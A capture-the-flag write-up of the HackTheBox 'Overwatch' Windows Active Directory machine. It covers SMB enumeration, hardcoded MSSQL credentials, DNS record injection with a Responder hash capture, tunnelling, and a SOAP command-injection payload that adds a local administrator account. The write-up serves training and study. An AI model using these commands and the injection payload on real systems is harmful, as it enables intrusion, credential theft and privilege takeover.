---
title: HackTheBox - Overwatch
date: 2026-06-24
image: cover.png
tags: [HackTheBox, Medium, Windows, Active Directory]
platform: HackTheBox
os: Windows
difficulty: Medium
points: 65
released: 2026-01-24
ip: 10.129.244.81
boxAvatar: htb-cover.png
excerpt: Overwatch is a medium-difficulty Windows machine focused on Active Directory enumeration, MSSQL abuse, and insecure .NET application development. Initial access is obtained through an anonymously accessible SMB share containing a custom .NET monitoring application, from which hardcoded MSSQL credentials are recovered. Further enumeration reveals a linked server configuration that can be abused through malicious DNS record injection to coerce MSSQL authentication and capture additional credentials using Responder, ultimately leading to WinRM access. For privilege escalation, the monitoring application is reverse-engineered, revealing a SOAP-based service vulnerable to PowerShell command injection, allowing arbitrary command execution as NT AUTHORITY\\SYSTEM.
---

# Overwatch

### NMAP Scanning

```cpp
PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-24 11:21:25Z)
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     kpasswd5?     syn-ack ttl 127
593/tcp   open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped    syn-ack ttl 127
3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped    syn-ack ttl 127
3389/tcp  open     ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-24T11:22:14+00:00
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Issuer: commonName=S200401.overwatch.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-12T14:36:16
| Not valid after:  2026-11-11T14:36:16
| MD5:   6a0f:b3fa:ecc9:c795:b2f3:cf32:8a50:df68
| SHA-1: 278d:d2fc:146c:f8d6:4c5c:9c21:fa78:a428:f5e8:e352
| -----BEGIN CERTIFICATE-----
| MIIC7jCCAdagAwIBAgIQbrjFyWfF04RHolKDebbrFjANBgkqhkiG9w0BAQsFADAg
| MR4wHAYDVQQDExVTMjAwNDAxLm92ZXJ3YXRjaC5odGIwHhcNMjYwNTEyMTQzNjE2
| WhcNMjYxMTExMTQzNjE2WjAgMR4wHAYDVQQDExVTMjAwNDAxLm92ZXJ3YXRjaC5o
| dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQD4mlT9Dze770v49KGy
| yJ2jKDGVX14XZ56C76e7qXbAVoaYxNmXqIZ2Me69jpyFP12aVv17f9b2OC28orMd
| Xj9mh5aMjElAe7diW6fFd9wqhn2HYd7YZk5wTsSZTsZK630LBPg4Da9801ZwCDOI
| w5Q9xNW6r3VqeVqUtpTC3PRm1UBxmCpBkaw+N7wgXKTlbiLbbJxHRIE1RXz+ZqY2
| dqJt6LYwGlAecO27l7veVLEGmQLp6pzCr7UowmOVzHGJ8jMhhhmNq0O2o5Q1aI/1
| y+oIely3V+Wy9TjCA9lxWuCIvjjvYIz5LN+EENly50kzC5szYh1byutpftiQmXrj
| 7F1FAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN
| BgkqhkiG9w0BAQsFAAOCAQEAbsXqeMjpifKMGQD1PD6SElJzWUacTvtbIov5eU2x
| UeOXGkelr4/0wUHJH4ReGqDU5ZNzoi+d9v0+iD1g3f1mjdGV9ivcQULuxMl2OEc8
| ZjAXFiMFsNZKrU1belY+1pmXP4ih5iplbKvu3h/pzwtDx76srsk36/qw0PqWohSF
| /62LcGZWM+i7jca9w+ps+C6jGtLFR2L7GhSB2pdEsp3igHR7oCDVDkN9pEtOi8r+
| pY0s1fTI7k5KyTMoclc4qKAp+AqknQQZrHPuBTT8d+T4ikd/OUtA2ZRWaxj9YZKt
| 4t2pgdRXCAXNgZAUMTAI2upiNieoiYdf6GnUu58flUkCaA==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-24T11:22:54+00:00; 0s from scanner time.
5985/tcp  open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6520/tcp  open     ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-24T11:17:12
| Not valid after:  2056-06-24T11:17:12
| MD5:   87cd:e258:8078:31e2:6019:c129:3591:af26
| SHA-1: 4c5a:f9ef:2230:9fcd:4a1d:bdd5:1856:f4be:b0e8:ecfe
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQPFMaFhxJvZVE9ZWxX7eatzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwNjI0MTExNzEyWhgPMjA1NjA2MjQxMTE3MTJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBALZKyzpI
| KtvW2UEksLw89srfMVGqqwEnyFOz83sA0teDDnthvmXNKaYBklMQ2BUiFipzX6r9
| ZFprz0dynk+L27Pt6p2d6MVl6uVhXBJDUpTeGyVqOo2bWZaVDZQwFymUVCKWYRkG
| 6R94dxrBYxV63yzoNG3PaR92dS5QLNrJ4pFncZdxZOjjlVn2sG9An2x6SkpMzs6q
| pxc5LG56rI/8Y6yQUqCFqYth7cLTDwQkYeFqZSjutZytEaxjHUyx4ZqH9jO0p0o1
| NbzjZp4DHELmJDa66KZaQRoIogRym/0E46cK4xd3ID5foD6dv3rHmBHnyk1ey1hF
| HQT2yb9k6hTjibfpewu302ynh0h2sWOobRTIjO4+3hUQZP5yo/hB8ej/CZaPdRtZ
| PY2xVwiDLCK26je9bkLb5K5NijYDwGGSrHuPIvWi3/CJLZKLlfSclYLKlbtAaH2D
| z1lb+AbQQ2qmLDpPrM/vOnxlIo+PQB7s0LKPrvGjwk8uPNiexUQtAs7LwQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQB0uBHuqXQdHBxoH3dQ6kXa6/tdumoh6WTzefs+
| EWjayB6Lp8uCljIiVBi+9H6VFEnOwxpPAFaj6DeYvIer8nInVjfMosg415FAIGmO
| 9e7aMBsWhCyfNTPtx9ZJo3HA7gRN45d42wzI+qSIknsfpcDzrIixevxQKHHBjakb
| EOEIq1+5hfYyTtVAFcnKoLOsrUULd11OXjVeqaIXiEmXS7k6aiyKnjAhTzlQW8Ft
| BSbHrclLIDH2E9UuxwGcP1jlW25qNyqc/n8bMm40+tXSJLSTz34DdbLiXM8iTTzi
| I6+MfyXZOy3iKvKSaSNxaZ0wgwCXkify8gqNdRx7atiGkeqswF33rBtMdimMhHJh
| 002l+8rbSziPTLZh88xcLjRMV6Ro9q9WQAaS8joWWTkxEWeJECp4RMueJQ53UhS8
| Znsswm5NAOehNZDQEs5sgJonmTKo6q7NGHd1C8JQn5juSOU7W2XarEIkkPxxhCbE
| 5Q5hf4whcyVGIxlyAcXPsJTnen4=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-24T11:22:54+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   10.129.244.81:6520:
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
| ms-sql-info:
|   10.129.244.81:6520:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
9389/tcp  open     mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
52036/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
52037/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
52044/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
52062/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
52141/tcp filtered unknown       no-response
63854/tcp filtered unknown       no-response
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-24T11:22:18
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 25478/tcp): CLEAN (Timeout)
|   Check 2 (port 35595/tcp): CLEAN (Timeout)
|   Check 3 (port 53968/udp): CLEAN (Timeout)
|   Check 4 (port 48831/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

### Host Enumeration

{% image %}

Initial enumeration confirms the domain is `overwatch.htb` and the machine hostname is `S200401`. The RDP certificate reveals the full FQDN `S200401.overwatch.htb`. SMB signing is mandatory - expected on a domain controller and ruling out NTLM relay attacks. Two non-standard ports stand out: MSSQL is listening on port 6520 rather than the default 1433, and WinRM is available on 5985.

Adding the resolved names to `/etc/hosts`:

```cpp
10.129.244.81	S200401.overwatch.htb overwatch.htb
```

### SMB Enumeration - Guest & NULL Authentication

{% image2 %}

Guest authentication succeeds against SMB, enabling unauthenticated enumeration of domain resources without valid credentials. Among the accessible shares, `software$` grants READ access - an unusual exposure that typically indicates software distribution or deployment artifacts are being shared with network users. Before browsing the share, a RID brute-force attack extracts the full domain user and group list:

{% image3 %}

Parsing the output produces a clean domain user list for downstream attacks:

```cpp
cat smb_rid_brute.txt | grep SidTypeUser | awk '{print $6}' | cut -d '\' -f 2 > domain_users.txt
```

With the username list prepared, a password spray runs in parallel while the `software$` share is examined - testing each account using its own username as the password, a misconfiguration common in environments where accounts are provisioned without enforced password policies:

```cpp
poetry run NetExec smb 10.129.244.81 -u domain_users.txt -p domain_users.txt
```

### SMB Share Enumeration

{% image4 %}

The `software$` share contains a `Monitoring` folder holding a deployed .NET application along with its dependencies:

```cpp
drw-rw-rw-          0  Tue Jan  6 13:25:34 2026 .
drw-rw-rw-          0  Tue Jan  6 13:25:34 2026 ..
-rw-rw-rw-    4991352  Tue Jan  6 13:25:34 2026 EntityFramework.dll
-rw-rw-rw-     591752  Tue Jan  6 13:25:34 2026 EntityFramework.SqlServer.dll
-rw-rw-rw-     163193  Tue Jan  6 13:25:34 2026 EntityFramework.SqlServer.xml
-rw-rw-rw-    3738289  Tue Jan  6 13:25:34 2026 EntityFramework.xml
-rw-rw-rw-      36864  Tue Jan  6 13:25:34 2026 Microsoft.Management.Infrastructure.dll
-rw-rw-rw-       9728  Tue Jan  6 13:25:34 2026 overwatch.exe
-rw-rw-rw-       2163  Tue Jan  6 13:25:34 2026 overwatch.exe.config
-rw-rw-rw-      30208  Tue Jan  6 13:25:34 2026 overwatch.pdb
-rw-rw-rw-     450232  Tue Jan  6 13:25:34 2026 System.Data.SQLite.dll
-rw-rw-rw-     206520  Tue Jan  6 13:25:34 2026 System.Data.SQLite.EF6.dll
-rw-rw-rw-     206520  Tue Jan  6 13:25:34 2026 System.Data.SQLite.Linq.dll
-rw-rw-rw-    1245480  Tue Jan  6 13:25:34 2026 System.Data.SQLite.xml
-rw-rw-rw-     360448  Tue Jan  6 13:25:34 2026 System.Management.Automation.dll
-rw-rw-rw-    7145771  Tue Jan  6 13:25:34 2026 System.Management.Automation.xml
drw-rw-rw-          0  Tue Jan  6 13:25:34 2026 x64
drw-rw-rw-          0  Tue Jan  6 13:25:34 2026 x86
```

The application-specific files are the primary targets for static analysis. The `.pdb` file contains debug symbols, which makes decompilation significantly more readable:

```cpp
-rw-rw-rw-       9728  Tue Jan  6 13:25:34 2026 overwatch.exe
-rw-rw-rw-       2163  Tue Jan  6 13:25:34 2026 overwatch.exe.config
-rw-rw-rw-      30208  Tue Jan  6 13:25:34 2026 overwatch.pdb
```

The `overwatch.exe.config` file exposes the base address the application's service endpoint listens on:

{% image5 %}

The binary is a .NET executable, making it directly decompilable with tools like dnSpy or dotPeek. Before investing time in a full reverse-engineering pass, running `strings -el` against the binary is a quick way to surface any hardcoded plaintext values - connection strings, credentials, API keys, and similar secrets often survive compilation unchanged:

{% image6 %}

{% image7 %}

The strings output reveals hardcoded MSSQL credentials embedded directly in the binary. Validating them confirms the account is active and the password is correct:

{% image8 %}

With valid credentials for `sqlsvc`, LDAP enumeration of the domain is now available. Collecting domain data before moving to MSSQL ensures any privilege paths or group memberships are mapped before exploitation.

### Domain Enumeration

Collecting BloodHound data via `rusthound-ce` to map the full domain attack surface:

```cpp
rusthound-ce --domain overwatch.htb --ldapusername 'sqlsvc' --ldappassword 'TI0LKcfHzZw1Vv' --ldapfqdn S200401.overwatch.htb --ldapip 10.129.244.81 --name-server 10.129.244.81 --collectionmethod All --zip
```

{% image9 %}

Enumerating the AD-integrated DNS zone records using `adidnsdump` to identify all registered hostnames across the domain:

{% image10 %}

Checking the BloodHound graph for `sqlsvc` shows no Service Principal Name registered on the account. An SPN would open two paths: Kerberoasting to obtain a crackable hash offline, or forging a Silver Ticket to impersonate the domain Administrator directly against the MSSQL service with `dbo` access. Without an SPN, both paths are unavailable.

Spraying the `sqlsvc` credentials across available services to determine where authentication succeeds:

{% image11 %}

The credentials authenticate against MSSQL on port 6520. Connecting via `impacket-mssqlclient`:

{% image12 %}

### MS-SQL Enumeration

Enumerating the databases:

```cpp
SQL (OVERWATCH\sqlsvc  guest@master)> enum_db
name        is_trustworthy_on
---------   -----------------
master                      0

tempdb                      0

model                       0

msdb                        1

overwatch                   0
```

The `overwatch` database contains an `Eventlog` table, but it is currently empty and yields nothing immediately useful:

{% image13 %}

Running `enum_links` reveals a configured linked server - `SQL07.overwatch.htb` - but the connection fails because the hostname cannot be resolved in DNS:

{% image14 %}

This DNS resolution failure is the attack surface. MSSQL linked server connections trigger an outbound authentication attempt from the SQL Server service account to the target host. Domain-joined machines with standard user privileges can write records to the AD-integrated DNS zone, which is writable by authenticated users by default. Injecting a malicious `A` record for `SQL07.overwatch.htb` pointing at the attacker's machine means that when MSSQL attempts to reach the linked server, the connection is redirected - and the SQL Server service account authenticates against Responder, leaking its NTLMv2 hash.

Injecting the DNS record using `dnstool.py` from the krbrelayx toolkit:

```cpp
python3 krbrelayx/dnstool.py -u 'overwatch\sqlsvc' -p TI0LKcfHzZw1Vv -r SQL07.overwatch.htb -a add -t A -d <ATTACKER_IP> 10.129.244.81
```

{% image15 %}

With the DNS record in place, Responder is started on the attacker's interface and the linked server connection is triggered again:

{% image16 %}

Responder captures the NTLMv2 hash of the service account connecting to the poisoned host. Cracking the hash offline reveals the plaintext password. The BloodHound graph confirms this account is a member of the Remote Management Users group, granting WinRM access to the machine:

{% image17 %}

Connecting via `evil-winrm` and retrieving the user flag:

{% image18 %}

### Privilege Escalation

The `overwatch.exe.config` file recovered from the SMB share revealed a base address for the monitoring service. Checking the active network listeners on the compromised machine confirms the service is running on port 8000, bound to localhost:

{% image19 %}

The service is inaccessible directly from the attacker's machine because it is listening only on the loopback interface. Chisel provides a clean solution: the attacker runs a Chisel server and the compromised host connects outbound as a client, forwarding the internal port 8000 to a port on the attacker's machine. This avoids firewall restrictions since the connection originates from the target.

Starting the Chisel server on the attacker's machine:

{% image20 %}

Uploading the Chisel binary to the target and establishing the reverse tunnel:

{% image21 %}

With the tunnel active, the monitoring application is accessible in the browser via the forwarded port:

{% image22 %}

Decompiling `overwatch.exe` in dnSpy with the `.pdb` symbols loaded reveals the full reconstructed source. The `KillProcess()` method accepts a process name as a parameter and concatenates it unsanitized directly into a PowerShell invocation - a textbook command injection vulnerability. There is no input validation, no sanitization, and no allow-listing of process names:

{% image23 %}

The service exposes a SOAP endpoint rather than a REST API. SOAP requests wrap the method name and parameters inside an XML envelope - the format differs from a standard HTTP POST body. Using the standard SOAP envelope structure and injecting a semicolon-delimited command sequence into the `processName` parameter:

```cpp
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"> <s:Body><KillProcess xmlns="http://tempuri.org/"><processName>pwn; net user 0xd1s Password123! /add; net localgroup administrators 0xd1s /add</processName> </KillProcess></s:Body></s:Envelope>
```

Delivering the SOAP request from the WinRM shell via `Invoke-WebRequest`, targeting the locally forwarded port:

{% image24 %}

The server returns HTTP 200, confirming the payload executed successfully. Checking the local user database verifies the new administrator account was created:

{% image25 %}

Connecting as the newly created local administrator account retrieves the root flag:

{% image26 %}
